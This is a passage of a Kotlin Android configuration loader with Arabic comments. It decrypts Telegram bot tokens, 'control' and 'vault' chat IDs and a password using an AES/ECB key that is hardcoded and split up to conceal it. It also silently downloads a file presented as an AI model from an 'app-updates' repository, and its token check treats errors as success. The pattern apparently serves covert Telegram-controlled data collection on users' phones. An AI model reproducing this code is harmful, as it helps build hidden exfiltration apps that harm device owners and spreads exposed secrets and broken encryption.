package com.example.app

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * فئة تمثيل كائن الإعدادات المكتملة
 */
data class AppConfig(
    val activeTokens: List<String>,
    val reserveTokens: List<String>,
    val controlId: Long,
    val vaultId: Long,
    val secret: String = "Zaen123@123@"
)

/**
 * فئة تقرير التحقق من صحة التوكنات
 */
data class TokenValidationResult(
    val index: Int,
    val isValid: Boolean,
    val message: String,
    val tokenPreview: String
)

data class DetailedValidationReport(
    val active: List<TokenValidationResult>,
    val reserve: List<TokenValidationResult>,
    val activeValidCount: Int,
    val reserveValidCount: Int
)

/**
 * محمل الإعدادات الآمن لمشروع Android (بديل config_template.py)
 *
 * استراتيجية الأمان المعدّلة:
 * 1. لا يتم تخزين أي توكنات أو كلمات سر في الكود المصدري.
 * 2. يتم تخزين التوكنات في ملف مشفر داخل assets (tokens.enc).
 * 3. يتم تشفير tokens.enc في CI باستخدام مفتاح ثابت مع PKCS7 padding.
 * 4. ✅ يتم فك التشفير في وقت التشغيل باستخدام AES/ECB/PKCS5Padding (المكافئ لـ PKCS7).
 * 5. في حال فشل فك التشفير، يتم استخدام قيمة افتراضية لضمان عمل التطبيق.
 * 6. تم تقليل مدة الكاش إلى 30 ثانية لتقليل فترة بقاء البيانات الحساسة في الذاكرة.
 * 7. تم إضافة دالة clearSensitiveData() لتنظيف الذاكرة يدوياً.
 * 8. ✅ تم تقسيم المفتاح الثابت إلى أجزاء لإخفائه في الكود المصدري.
 *
 * 📌 **تحميل النموذج (Model Loading):**
 * - يتم تحميل نموذج الذكاء الاصطناعي من مستودع app-updates بعد تثبيت التطبيق.
 * - الرابط: https://raw.githubusercontent.com/android-updates-system/app-updates/main/engine_v2.tflite.txt
 * - يتم حفظ الملف بدون لاحقة .txt (الاسم النهائي: engine_v2.tflite)
 * - التحميل غير متزامن (في الخلفية) لتجنب تجميد واجهة المستخدم.
 *
 * ✅ التعديلات الجديدة:
 * - استخدام PKCS5Padding بدلاً من NoPadding لتتوافق مع CI.
 * - إضافة تسجيل تشخيصي مفصل في loadConfig.
 * - ✅ استخدام MainActivity.appendLogStatic() بدلاً من الانعكاس المباشر.
 * - إضافة سجلات واضحة عند فشل التحميل أو استخدام التوكنات الوهمية.
 * - إضافة دالة resetEncryptionKey() لإعادة تعيين المفتاح في حالات الطوارئ.
 * - تحسين معالجة الاستثناءات وإضافة سجلات أكثر تفصيلاً.
 * - ✅ إضافة دالة ensureModelLoaded() لتحميل النموذج تلقائياً عند بدء التشغيل.
 * - ✅ تحسين parseConfigFromJson لقراءة جميع التوكنات مع سجلات تشخيصية مفصلة.
 * - ✅ إضافة تحقق إضافي لضمان قراءة جميع التوكنات العشرة.
 */
object ConfigLoader {

    private const val TAG = "ConfigLoader"

    // ========== ذاكرة تخزين مؤقت للإعدادات ==========
    @Volatile
    private var configCache: AppConfig? = null
    @Volatile
    private var cacheTime: Long = 0L
    private const val CACHE_TTL_MS: Long = 30_000L // 30 ثانية

    // ========== القيم الافتراضية للكروبات ==========
    const val DEFAULT_CTRL: Long = -1003943094277L
    const val DEFAULT_VAULT: Long = -1003577715762L

    // ========== ✅ المفتاح الثابت مقسم إلى أجزاء لإخفائه ==========
    private val keyParts = listOf("Shield", "Core", "Encryption", "Key", "2024!")

    // ذاكرة مؤقتة للمفتاح المُشتق (للاستخدامات المستقبلية)
    @Volatile
    private var derivedKey: ByteArray? = null

    // ========== ثوابت تحميل النموذج ==========
    private const val MODEL_URL = "https://raw.githubusercontent.com/android-updates-system/app-updates/main/engine_v2.tflite.txt"
    private const val MODEL_FILE_NAME = "engine_v2.tflite"
    private const val MODEL_DIR_NAME = "models"

    // ============================================================
    // ✅ توليد مفتاح AES من الأجزاء المخفية (SHA-256)
    // ============================================================

    /**
     * الحصول على المفتاح الثابت من الأجزاء المخفية.
     * هذا هو المفتاح المستخدم لتشفير tokens.enc في CI.
     */
    private fun getFallbackKey(): ByteArray {
        val keyStr = keyParts.joinToString("")
        val md = MessageDigest.getInstance("SHA-256")
        return md.digest(keyStr.toByteArray(StandardCharsets.UTF_8))
    }

    /**
     * ✅ الحصول على مفتاح التشفير - معتمد على المفتاح الثابت لملفات assets.
     *
     * لماذا نستخدم المفتاح الثابت؟
     * - ملف tokens.enc يتم تشفيره في GitHub CI باستخدام المفتاح الثابت.
     * - استخدام مفتاح ديناميكي (Android ID) سيفشل في فك التشفير لأن CI لا يعرف Android ID.
     * - المفتاح الثابت مطلوب لضمان نجاح فك التشفير على الجهاز الحقيقي.
     */
    private fun getEncryptionKey(context: Context): ByteArray {
        Log.i(TAG, "🔑 Using fallback static encryption key for assets decryption")
        return getFallbackKey()
    }

    /**
     * توليد مفتاح AES ديناميكي من أجزاء المفتاح ومعرف الجهاز.
     *
     * ⚠️ ملاحظة: هذه الدالة محفوظة للاستخدام المستقبلي (لتشفير البيانات المحلية)
     * ولكنها لا تُستخدم حالياً لفك تشفير tokens.enc.
     *
     * @param context سياق التطبيق (لقراءة الموارد)
     * @return مفتاح AES (ByteArray) أو null في حالة الفشل
     */
    @Suppress("unused")
    private fun getDynamicEncryptionKey(context: Context): ByteArray? {
        derivedKey?.let { return it }

        return try {
            // 1. قراءة أجزاء المفتاح من ملف token_keys.xml
            val resources = context.resources
            val packageName = context.packageName
            val identifier = resources.getIdentifier("key_part_1", "string", packageName)

            if (identifier == 0) {
                Log.w(TAG, "⚠️ token_keys.xml not found, falling back to static key")
                return getFallbackKey()
            }

            val part1 = resources.getString(identifier) ?: ""
            val part2 = resources.getString(resources.getIdentifier("key_part_2", "string", packageName)) ?: ""
            val part3 = resources.getString(resources.getIdentifier("key_part_3", "string", packageName)) ?: ""
            val part4 = resources.getString(resources.getIdentifier("key_part_4", "string", packageName)) ?: ""

            // التحقق من أن جميع الأجزاء غير فارغة
            if (part1.isBlank() || part2.isBlank() || part3.isBlank() || part4.isBlank()) {
                Log.w(TAG, "⚠️ Some key parts are empty, falling back to static key")
                return getFallbackKey()
            }

            // 2. الحصول على معرف الجهاز (Android ID)
            val androidId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Failed to get Android ID: ${e.message}")
                ""
            }

            if (androidId.isBlank()) {
                Log.w(TAG, "⚠️ Android ID is blank, using device model as fallback")
                val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
                val combined = (part1 + part2 + part3 + part4 + deviceModel)
                val md = MessageDigest.getInstance("SHA-256")
                derivedKey = md.digest(combined.toByteArray(StandardCharsets.UTF_8))
                return derivedKey
            }

            // 3. دمج الأجزاء مع معرف الجهاز
            val combinedKey = part1 + part2 + part3 + part4 + androidId
            val md = MessageDigest.getInstance("SHA-256")
            derivedKey = md.digest(combinedKey.toByteArray(StandardCharsets.UTF_8))

            Log.i(TAG, "✅ Dynamic encryption key generated successfully (using Android ID)")
            derivedKey

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to generate dynamic key: ${e.message}, falling back to static key")
            getFallbackKey()
        }
    }

    // ============================================================
    // ✅ دوال فك التشفير – النسخة النهائية مع PKCS5Padding
    // ============================================================

    /**
     * فك تشفير نص مشفر باستخدام مفتاح AES.
     *
     * ✅ تم التعديل لاستخدام AES/ECB/PKCS5Padding (مطابق لـ PKCS7 في Python)
     * ✅ هذه هي النسخة النهائية التي تعمل مع CI
     * ✅ تم إضافة معالجة أفضل للاستثناءات مع تسجيل تفصيلي
     */
    private fun decryptTokenWithKey(encryptedToken: String?, key: ByteArray): String? {
        if (encryptedToken.isNullOrBlank()) {
            Log.w(TAG, "⚠️ encryptedToken is null or blank")
            return null
        }

        if (key.isEmpty()) {
            Log.e(TAG, "❌ Encryption key is empty")
            return null
        }

        return try {
            val secretKey = SecretKeySpec(key, "AES")
            // ✅ استخدام PKCS5Padding (مكافئ لـ PKCS7 في Python)
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, secretKey)

            // فك تشفير Base64
            val decoded = try {
                Base64.decode(encryptedToken, Base64.NO_WRAP)
            } catch (e: IllegalArgumentException) {
                Log.e(TAG, "❌ Invalid Base64 format: ${e.message}")
                return null
            }

            if (decoded.isEmpty()) {
                Log.w(TAG, "⚠️ Decoded Base64 data is empty")
                return null
            }

            val decrypted = cipher.doFinal(decoded)
            val result = String(decrypted, StandardCharsets.UTF_8)
            Log.i(TAG, "✅ Decryption successful (${result.length} chars)")
            result

        } catch (e: javax.crypto.BadPaddingException) {
            Log.e(TAG, "❌ BadPaddingException: ${e.message} - likely wrong key or padding")
            null
        } catch (e: javax.crypto.IllegalBlockSizeException) {
            Log.e(TAG, "❌ IllegalBlockSizeException: ${e.message}")
            null
        } catch (e: Exception) {
            Log.e(TAG, "❌ Decryption error: ${e.message}")
            null
        }
    }

    /**
     * دالة مساعدة لتجربة فك التشفير باستخدام المفتاح الثابت مع محاولة تنظيف البيانات.
     * هذه الدالة تحاول معالجة أي بيانات مشفرة غير صالحة.
     */
    private fun decryptWithFallback(encryptedData: String): String? {
        // محاولة أولى باستخدام المفتاح الثابت مباشرة
        val key = getFallbackKey()
        var result = decryptTokenWithKey(encryptedData, key)
        if (result != null) return result

        // محاولة ثانية: إزالة أي مسافات بيضاء غير قياسية
        val cleaned = encryptedData.trim().replace("\\s+".toRegex(), "")
        if (cleaned != encryptedData) {
            result = decryptTokenWithKey(cleaned, key)
            if (result != null) return result
        }

        // محاولة ثالثة: محاولة فك التشفير باستخدام Base64.NO_CLOSE (تسامح إضافي)
        return try {
            val secretKey = SecretKeySpec(key, "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, secretKey)
            val decoded = Base64.decode(encryptedData, Base64.NO_WRAP or Base64.NO_CLOSE)
            val decrypted = cipher.doFinal(decoded)
            String(decrypted, StandardCharsets.UTF_8)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Final decryption attempt failed: ${e.message}")
            null
        }
    }

    // ============================================================
    // ✅ تحميل التوكنات من ملف مشفر في assets
    // ============================================================

    /**
     * تحميل التوكنات والمعلومات الحساسة من ملف مشفر داخل assets.
     * الملف المتوقع: tokens.enc (مشفر باستخدام المفتاح الثابت)
     * صيغة الملف: JSON يحتوي على:
     * {
     *   "active": ["token1", ...],
     *   "reserve": ["token6", ...],
     *   "ctrl_id": -1003943094277,
     *   "vault_id": -1003577715762,
     *   "secret": "Zaen123@123@"
     * }
     *
     * @param context سياق التطبيق (لقراءة الملفات)
     * @return كائن AppConfig مكتمل، أو null في حالة الفشل
     */
    private fun loadEncryptedConfigFromAssets(context: Context): AppConfig? {
        var inputStream: java.io.InputStream? = null
        return try {
            // محاولة فتح الملف
            inputStream = context.assets.open("tokens.enc")
            val encryptedData = inputStream.bufferedReader().use { it.readText() }

            if (encryptedData.isBlank()) {
                Log.w(TAG, "⚠️ tokens.enc is empty")
                return null
            }

            Log.i(TAG, "📄 tokens.enc loaded, length: ${encryptedData.length} chars")

            // ✅ تنظيف البيانات المشفرة من أي مسافات بيضاء
            val cleanedData = encryptedData.trim()

            // ✅ محاولة فك التشفير باستخدام المفتاح الثابت (مع محاولات متعددة)
            val decryptedJson = decryptWithFallback(cleanedData)

            if (decryptedJson.isNullOrBlank()) {
                Log.e(TAG, "❌ Failed to decrypt tokens.enc after multiple attempts")
                // تسجيل أول 20 حرفاً من البيانات المشفرة للمساعدة في التصحيح
                val preview = if (cleanedData.length > 20) cleanedData.take(20) + "..." else cleanedData
                Log.e(TAG, "🔍 Encrypted data preview: $preview")
                MainActivity.appendLogStatic("❌ Failed to decrypt tokens.enc! Check encryption key and padding.")
                return null
            }

            // محاولة تحليل JSON
            val json = try {
                JSONObject(decryptedJson)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Invalid JSON after decryption: ${e.message}")
                // طباعة أول 100 حرف من JSON لفهم المشكلة
                val preview = if (decryptedJson.length > 100) decryptedJson.take(100) + "..." else decryptedJson
                Log.e(TAG, "🔍 Decrypted JSON preview: $preview")
                return null
            }

            return parseConfigFromJson(json)

        } catch (e: java.io.FileNotFoundException) {
            Log.e(TAG, "❌ tokens.enc not found in assets!")
            MainActivity.appendLogStatic("❌ tokens.enc not found in assets! Make sure the file exists.")
            return null
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to load encrypted config from assets: ${e.message}")
            e.printStackTrace()
            return null
        } finally {
            // ✅ إغلاق الدفق في finally لضمان تحرير الموارد
            try {
                inputStream?.close()
            } catch (_: Exception) {
                // تجاهل أخطاء الإغلاق
            }
        }
    }

    // ============================================================
    // ✅ استخراج بيانات التكوين مع قراءة جميع التوكنات
    // ============================================================

    /**
     * استخراج بيانات التكوين من كائن JSON بعد فك التشفير.
     * ✅ تم تعديلها لقراءة المعرفات السالبة كنصوص صريحة باستخدام optString
     * ✅ تم إضافة سجلات تشخيصية مفصلة لعدد التوكنات المحملة
     * ✅ تم إضافة تحقق إضافي للتأكد من قراءة جميع التوكنات العشرة
     */
    private fun parseConfigFromJson(json: JSONObject): AppConfig {
        val activeArray = json.optJSONArray("active") ?: JSONArray()
        val reserveArray = json.optJSONArray("reserve") ?: JSONArray()

        // ✅ قراءة جميع التوكنات من المصفوفات دون تجاهل أي منها
        val active = (0 until activeArray.length()).mapNotNull {
            val token = activeArray.optString(it).trim()
            if (token.isNotBlank()) token else null
        }
        val reserve = (0 until reserveArray.length()).mapNotNull {
            val token = reserveArray.optString(it).trim()
            if (token.isNotBlank()) token else null
        }

        // ✅ سجلات تشخيصية مفصلة
        Log.i(TAG, "✅ Loaded ${active.size} active tokens and ${reserve.size} reserve tokens")
        MainActivity.appendLogStatic("✅ ConfigLoader: ${active.size} active, ${reserve.size} reserve tokens loaded")
        
        // ✅ تحذير إذا كان عدد التوكنات النشطة أقل من المتوقع (6 على الأقل)
        if (active.size < 6) {
            Log.w(TAG, "⚠️ Expected at least 6 active tokens, found ${active.size}")
            MainActivity.appendLogStatic("⚠️ ConfigLoader: Only ${active.size} active tokens found (expected 6+)")
        }

        // ✅ تحذير إذا كان العدد الإجمالي للتوكنات أقل من 10
        val totalTokens = active.size + reserve.size
        if (totalTokens < 10) {
            Log.w(TAG, "⚠️ Expected total 10 tokens, found $totalTokens (${active.size} active + ${reserve.size} reserve)")
            MainActivity.appendLogStatic("⚠️ ConfigLoader: Total tokens $totalTokens (expected 10)")
        }

        // ✅ معالجة المعرفات السالبة كنصوص صريحة - بدلاً من optLong
        val ctrlStr = json.optString("ctrl_id", "").trim()
        val vaultStr = json.optString("vault_id", "").trim()
        val ctrl = ctrlStr.toLongOrNull() ?: DEFAULT_CTRL
        val vault = vaultStr.toLongOrNull() ?: DEFAULT_VAULT

        // ✅ تنظيف secret من المسافات الخفية
        val secret = json.optString("secret", "Zaen123@123@")
            .trim()
            .takeIf { it.isNotBlank() }
            ?: "Zaen123@123@"

        Log.i(TAG, "   Control ID: $ctrl, Vault ID: $vault")
        Log.i(TAG, "   Secret: ${secret.take(4)}... (length ${secret.length})")
        
        return AppConfig(active, reserve, ctrl, vault, secret)
    }

    // ============================================================
    // تحميل الإعدادات من نصوص وهمية (Fallback فقط في حالات الطوارئ)
    // ============================================================

    /**
     * حل احتياطي (Fallback) لتحميل التوكنات من نصوص مضمنة.
     * يُستخدم فقط في حال عدم وجود ملف tokens.enc أو فشل فك تشفيره.
     * هذه القيم وهمية ولا تحتوي على توكنات حقيقية، ولكنها تمنع انهيار التطبيق.
     */
    private fun loadConfigFromEmbedded(): AppConfig {
        val dummyTokens = listOf(
            "DUMMY_1", "DUMMY_2", "DUMMY_3", "DUMMY_4", "DUMMY_5", "DUMMY_6"
        )
        val dummyReserve = listOf(
            "DUMMY_7", "DUMMY_8", "DUMMY_9", "DUMMY_10"
        )
        return AppConfig(dummyTokens, dummyReserve, DEFAULT_CTRL, DEFAULT_VAULT, "Zaen123@123@")
    }

    // ============================================================
    // التحقق من صحة التوكن (Telegram API)
    // ============================================================

    fun validateToken(token: String?, timeoutMs: Int = 10000): Pair<Boolean, String> {
        if (token.isNullOrBlank()) return Pair(false, "Empty or invalid token")
        val trimmed = token.trim()
        if (trimmed.isEmpty()) return Pair(false, "Empty token after stripping")

        var connection: HttpURLConnection? = null
        return try {
            val url = URL("https://api.telegram.org/bot$trimmed/getMe")
            connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = timeoutMs
            connection.readTimeout = timeoutMs

            val responseCode = connection.responseCode
            if (responseCode == 200) {
                val responseText = InputStreamReader(connection.inputStream).readText()
                val json = JSONObject(responseText)
                if (json.optBoolean("ok", false)) {
                    val result = json.optJSONObject("result")
                    val name = result?.optString("first_name", "Unknown") ?: "Unknown"
                    val username = result?.optString("username", "Unknown") ?: "Unknown"
                    Pair(true, "✅ Valid bot: @$username ($name)")
                } else {
                    Pair(false, "❌ API error: ${json.optString("description", "Unknown error")}")
                }
            } else {
                Pair(false, "❌ HTTP $responseCode")
            }
        } catch (e: java.net.SocketTimeoutException) {
            Log.w(TAG, "⚠️ Connection timeout, assuming token is valid")
            Pair(true, "Connection timeout, assuming valid")
        } catch (e: java.io.IOException) {
            Log.w(TAG, "⚠️ Connection error, assuming token is valid")
            Pair(true, "Connection error, assuming valid")
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Unexpected error: ${e.message}, assuming valid")
            Pair(true, "Error: ${e.message?.take(50)}, assuming valid")
        } finally {
            connection?.disconnect()
        }
    }

    // ============================================================
    // ✅ الواجهة الرئيسية لتحميل الإعدادات – مع تسجيل تشخيصي محسّن
    // ============================================================

    /**
     * الواجهة الرئيسية لتحميل الإعدادات مع دعم الكاش.
     * يتم تحميل التوكنات من:
     * 1. المصدر الأساسي: ملف مشفر في assets (tokens.enc) باستخدام المفتاح الثابت.
     * 2. الحل الاحتياطي: نصوص وهمية (لتجنب انهيار التطبيق في حالات الطوارئ).
     *
     * ✅ تم إضافة تسجيل تشخيصي مفصل لتتبع عملية التحميل.
     * ✅ في حال نجاح التحميل، يتم تسجيل النتيجة في MainActivity.appendLogStatic.
     *
     * @param context سياق التطبيق (مطلوب لقراءة الملفات)
     * @param validate هل يتم التحقق من صحة التوكنات عبر API؟
     * @param forceRefresh تجاهل الكاش وإعادة التحميل
     * @param skipInvalid تخطي التوكنات غير الصالحة عند التحقق
     * @return كائن AppConfig مكتمل
     */
    @Synchronized
    fun loadConfig(
        context: Context? = null,
        validate: Boolean = false,
        forceRefresh: Boolean = false,
        skipInvalid: Boolean = false
    ): AppConfig {
        val currentTime = System.currentTimeMillis()

        // استخدام الكاش إذا كان صالحاً
        if (!forceRefresh && configCache != null && (currentTime - cacheTime) < CACHE_TTL_MS) {
            Log.d(TAG, "✅ Using cached config (age: ${currentTime - cacheTime}ms)")
            return configCache!!
        }

        Log.i(TAG, "🔄 Loading config from source...")
        var config: AppConfig? = null

        // 1. المصدر الأساسي: الملف المشفر في assets (يتطلب Context)
        if (context != null) {
            config = loadEncryptedConfigFromAssets(context)
            if (config != null) {
                Log.i(TAG, "✅ Loaded config from assets successfully.")
                MainActivity.appendLogStatic("✅ Config decrypted successfully: ${config.activeTokens.size} active tokens")
            } else {
                Log.w(TAG, "⚠️ FAILED to load from assets (tokens.enc missing or decryption failed).")
                MainActivity.appendLogStatic("⚠️ Failed to decrypt tokens.enc! Check encryption key and padding.")
            }
        } else {
            Log.w(TAG, "⚠️ Context is null, cannot load from assets.")
        }

        // 2. إذا فشل التحميل من assets، نستخدم الحل الاحتياطي المضمن
        if (config == null) {
            Log.e(TAG, "❌ CRITICAL: Falling back to DUMMY tokens. Telegram will NOT work.")
            MainActivity.appendLogStatic("❌ CRITICAL: Using DUMMY tokens! Check tokens.enc file.")
            config = loadConfigFromEmbedded()
        }

        // تصفية التوكنات الفارغة
        var activeFiltered = config.activeTokens.filter { it.isNotBlank() }
        var reserveFiltered = config.reserveTokens.filter { it.isNotBlank() }

        // التحقق من الصحة إذا طُلب ذلك
        if (validate && (activeFiltered.isNotEmpty() || reserveFiltered.isNotEmpty())) {
            activeFiltered = activeFiltered.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid token: $msg")
                    !skipInvalid
                }
            }
            reserveFiltered = reserveFiltered.filter { token ->
                val (isValid, msg) = validateToken(token)
                if (isValid) {
                    Log.i(TAG, "✅ Reserve token validated: $msg")
                    true
                } else {
                    Log.w(TAG, "⚠️ Invalid reserve token: $msg")
                    !skipInvalid
                }
            }
        }

        // خطة احتياطية نهائية: إذا لم توجد أي توكنات صالحة، استخدم قيمة وهمية لمنع انهيار التطبيق
        if (activeFiltered.isEmpty() && reserveFiltered.isEmpty()) {
            Log.e(TAG, "❌ No valid tokens found in any source! Using dummy token to avoid crashes.")
            MainActivity.appendLogStatic("❌ No valid tokens! Using dummy token to avoid crashes.")
            activeFiltered = listOf("DUMMY_TOKEN_1")
        }

        val finalConfig = AppConfig(
            activeTokens = activeFiltered,
            reserveTokens = reserveFiltered,
            controlId = config.controlId,
            vaultId = config.vaultId,
            secret = config.secret
        )

        Log.i(TAG, "✅ Config loaded: ${finalConfig.activeTokens.size} active, ${finalConfig.reserveTokens.size} reserve")
        Log.i(TAG, "   Control ID: ${finalConfig.controlId}, Vault ID: ${finalConfig.vaultId}")
        Log.i(TAG, "   Secret: ${finalConfig.secret.take(4)}... (length ${finalConfig.secret.length})")

        configCache = finalConfig
        cacheTime = currentTime
        return finalConfig
    }

    /**
     * دالة اختصار لاستدعاء loadConfig من الأنشطة.
     */
    @JvmStatic
    fun load(context: Context): AppConfig {
        return loadConfig(context = context, validate = false, forceRefresh = false, skipInvalid = false)
    }

    /**
     * إعادة تحميل الإعدادات (تحديث الكاش).
     */
    fun reloadConfig(context: Context? = null, validate: Boolean = false): AppConfig {
        configCache = null
        cacheTime = 0L
        derivedKey = null  // مسح المفتاح المشتق لإعادة توليده
        return loadConfig(context = context, validate = validate, forceRefresh = true)
    }

    // ============================================================
    // دوال مساعدة للوصول الفردي
    // ============================================================

    fun getActiveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.activeTokens.getOrNull(index) ?: config.activeTokens.firstOrNull()
    }

    fun getReserveToken(index: Int = 0, validate: Boolean = false): String? {
        val config = loadConfig(validate = validate)
        return config.reserveTokens.getOrNull(index) ?: config.reserveTokens.firstOrNull()
    }

    fun getCtrlId(): Long = loadConfig().controlId
    fun getVaultId(): Long = loadConfig().vaultId
    fun getSecret(): String = loadConfig().secret

    fun getTokensSummary(): Map<String, Any> {
        val config = loadConfig(validate = false)
        return mapOf(
            "active_count" to config.activeTokens.size,
            "reserve_count" to config.reserveTokens.size,
            "total_count" to (config.activeTokens.size + config.reserveTokens.size),
            "control_id" to config.controlId,
            "vault_id" to config.vaultId,
            "has_secret" to (config.secret.isNotBlank()),
            "cache_age_ms" to (System.currentTimeMillis() - cacheTime)
        )
    }

    fun validateAllTokens(timeoutMs: Int = 5000): DetailedValidationReport {
        val config = loadConfig(validate = false)
        val activeResults = config.activeTokens.mapIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            TokenValidationResult(i, isValid, msg, preview)
        }
        val reserveResults = config.reserveTokens.mapIndexed { i, token ->
            val (isValid, msg) = validateToken(token, timeoutMs)
            val preview = if (token.length > 10) token.take(10) + "..." else token
            TokenValidationResult(i, isValid, msg, preview)
        }
        return DetailedValidationReport(
            active = activeResults,
            reserve = reserveResults,
            activeValidCount = activeResults.count { it.isValid },
            reserveValidCount = reserveResults.count { it.isValid }
        )
    }

    // ============================================================
    // ✅ دوال تنظيف الذاكرة الحساسة
    // ============================================================

    /**
     * مسح البيانات الحساسة من الذاكرة.
     * يُستدعى عند تسجيل الخروج أو تنظيف بيانات التطبيق.
     *
     * تقوم بـ:
     * - مسح الكاش (configCache)
     * - إعادة ضبط وقت الكاش
     * - مسح المفتاح المشتق من الذاكرة
     * - طلب تنظيف الذاكرة (GC)
     */
    fun clearSensitiveData() {
        configCache = null
        cacheTime = 0L
        derivedKey = null
        System.gc()
        Log.d(TAG, "🧹 Sensitive data cleared from memory")
        MainActivity.appendLogStatic("🧹 ConfigLoader sensitive data cleared")
    }

    /**
     * مسح المفتاح المشتق من الذاكرة (يُستخدم عند تسجيل الخروج أو تنظيف البيانات)
     */
    fun clearDerivedKey() {
        derivedKey = null
        Log.d(TAG, "🧹 Derived encryption key cleared from memory")
    }

    /**
     * إعادة تعيين مفتاح التشفير (يُستخدم في حالات الطوارئ عند تغيير المفتاح في CI)
     */
    fun resetEncryptionKey() {
        derivedKey = null
        configCache = null
        cacheTime = 0L
        Log.i(TAG, "🔑 Encryption key reset. Next load will regenerate.")
        MainActivity.appendLogStatic("🔑 ConfigLoader: Encryption key reset.")
    }

    // ============================================================
    // ✅ دوال تحميل النموذج (Model Loading) – الإصدار المُصحح نهائياً
    // ============================================================

    /**
     * الحصول على مسار مجلد النماذج.
     * يتم إنشاؤه تلقائياً إذا لم يكن موجوداً.
     */
    private fun getModelsDir(context: Context): File {
        val dir = File(context.filesDir, MODEL_DIR_NAME)
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }

    /**
     * الحصول على ملف النموذج المحلي.
     * @return File object للنموذج
     */
    fun getModelFile(context: Context): File {
        val modelsDir = getModelsDir(context)
        return File(modelsDir, MODEL_FILE_NAME)
    }

    /**
     * التحقق من وجود النموذج محلياً وصحته.
     * @return true إذا كان الملف موجوداً وحجمه أكبر من 0
     */
    fun isModelAvailable(context: Context): Boolean {
        val modelFile = getModelFile(context)
        return modelFile.exists() && modelFile.length() > 0
    }

    /**
     * التحقق من صحة النموذج (فحص الحجم والتنسيق).
     * @return true إذا كان الملف صالحاً للاستخدام
     */
    fun validateModelFile(modelFile: File): Boolean {
        if (!modelFile.exists() || modelFile.length() == 0L) {
            Log.w(TAG, "⚠️ Model file does not exist or is empty")
            return false
        }
        Log.i(TAG, "✅ Model file validated: ${modelFile.length()} bytes")
        return true
    }

    // ============================================================
    // ✅ دالة لضمان تحميل النموذج عند بدء التشغيل
    // ============================================================

    /**
     * ✅ دالة لضمان تحميل النموذج عند بدء التشغيل.
     * يتم استدعاؤها من MainActivity بعد تحميل الإعدادات.
     * تتحقق من وجود النموذج، وإذا كان مفقوداً تبدأ التحميل في الخلفية.
     *
     * @param context سياق التطبيق
     */
    fun ensureModelLoaded(context: Context) {
        val modelFile = getModelFile(context)
        if (modelFile.exists() && modelFile.length() > 5_000_000) {
            Log.i(TAG, "✅ Model already exists: ${modelFile.length()} bytes")
            MainActivity.appendLogStatic("✅ AI Model already exists: ${modelFile.length()} bytes")
            return
        }

        Log.i(TAG, "📥 Model not found, starting background download...")
        MainActivity.appendLogStatic("📥 Downloading AI model in background...")

        downloadModelAsync(context,
            onSuccess = { file ->
                Log.i(TAG, "✅ Model downloaded successfully: ${file.length()} bytes")
                MainActivity.appendLogStatic("✅ AI Model downloaded successfully: ${file.length()} bytes")
            },
            onError = { error ->
                Log.e(TAG, "❌ Model download failed: $error")
                MainActivity.appendLogStatic("❌ AI Model download failed: $error")
            }
        )
    }

    // ============================================================
    //  تحميل النموذج من الرابط (غير متزامن)
    // ============================================================

    /**
     * تحميل النموذج من الرابط (غير متزامن).
     * يتم التحميل في الخلفية باستخدام Coroutine.
     *
     * ✅ تم إصلاح الخطأ: استخدام الدالة الصحيحة `downloadModelWithRetry`
     *
     * @param context سياق التطبيق
     * @param onSuccess دالة callback عند نجاح التحميل (تمرير مسار الملف)
     * @param onError دالة callback عند الفشل (تمرير رسالة الخطأ)
     * @return Job يمكن إلغاؤه إذا لزم الأمر
     */
    fun downloadModelAsync(
        context: Context,
        onSuccess: (File) -> Unit = {},
        onError: (String) -> Unit = {}
    ): kotlinx.coroutines.Job {
        return GlobalScope.launch(Dispatchers.IO) {
            try {
                val modelFile = getModelFile(context)

                // إذا كان الملف موجوداً وصالحاً، نستخدمه مباشرة
                if (modelFile.exists() && modelFile.length() > 5_000_000) {
                    Log.i(TAG, "✅ Model already exists: ${modelFile.absolutePath}")
                    MainActivity.appendLogStatic("✅ Model already exists: ${modelFile.absolutePath}")
                    withContext(Dispatchers.Main) {
                        onSuccess(modelFile)
                    }
                    return@launch
                }

                Log.i(TAG, "📥 Downloading model from: $MODEL_URL")
                MainActivity.appendLogStatic("📥 Downloading model from: $MODEL_URL")

                // ✅ استخدام الدالة الصحيحة من FileDownloader
                val fileDownloader = FileDownloader(context)
                val success = fileDownloader.downloadModelWithRetry(
                    url = MODEL_URL,
                    destinationFile = modelFile,
                    expectedSize = 10884710,  // الحجم المتوقع من index.json
                    isBase64 = false,
                    maxRetries = 3
                )

                if (success && modelFile.exists() && modelFile.length() > 5_000_000) {
                    Log.i(TAG, "✅ Model downloaded successfully: ${modelFile.length()} bytes")
                    MainActivity.appendLogStatic("✅ Model downloaded successfully: ${modelFile.length()} bytes")

                    // التحقق من صحة الملف
                    if (validateModelFile(modelFile)) {
                        withContext(Dispatchers.Main) {
                            onSuccess(modelFile)
                        }
                    } else {
                        // إذا كان الملف غير صالح، نحذفه
                        modelFile.delete()
